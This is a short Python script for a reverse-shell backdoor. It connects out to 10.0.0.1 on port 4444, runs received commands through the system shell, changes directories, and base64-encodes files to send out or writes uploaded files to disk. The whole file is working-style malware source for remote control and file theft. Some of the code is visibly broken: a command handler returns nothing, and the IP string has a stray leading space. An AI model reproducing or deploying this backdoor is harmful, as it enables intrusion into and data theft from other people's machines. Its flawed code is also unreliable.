#!/usr/bin/env python
import os
import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # sock_stream is for TCP connection. Hence data in transit is transferred as a stream, not as messages.
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        # in every loop 1024 byte data will be added to json_data.
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
                # if this is enough it will return, otherwise it will run another loop to complete the packet.
            except ValueError:
                continue

    def execute_system_command(self, command):
        subprocess.check_output(command, shell=True)
        # we are setting shell=True because we are processing on it as a string, not a list.

    def change_current_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing the working directory to " + path
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
            # if file.read() method returns unknown characters, base64 converts them to known characters.
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successfull."

    def run(self):
        while True:
            command = self.reliable_receive()
            try:

                if command[0] == "exit":
                    # Because the command in the Listener is changed into a list by way of split() method.
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    # Because when cd command is as is, it works. If cd plus another argument it doesn't.
                    command_result = self.change_current_working_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command).decode()
            except Exception:
                command_result = "[-] Error during command execution."
            self.reliable_send(command_result)



my_backdoor = Backdoor(" 10.0.0.1", 4444)
my_backdoor.run()
